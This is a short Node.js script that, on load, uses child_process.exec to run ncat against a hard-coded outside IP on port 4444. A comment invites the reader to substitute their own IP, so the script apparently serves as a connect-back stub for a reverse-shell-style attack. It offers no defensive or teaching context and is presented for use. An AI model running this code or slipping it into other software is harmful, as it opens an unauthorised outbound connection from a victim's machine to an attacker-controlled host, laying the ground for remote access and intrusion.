const utillool = require('util');


const runshit = utillool.promisify(require('child_process').exec);

async function executeshit(execom) {
  const { stdout, stderr, error } = await runshit(execom);
  if(stderr){console.error('stderr:', stderr);}
  if(error){console.error('error:', error);}
  return stdout;
}


async function executecomz () {
    const execom = 'ncat -nv 39.116.14.122 4444'; // replace "iphere" with your ip
    const result = await executeshit(execom);
    console.log(result);
}


executecomz();
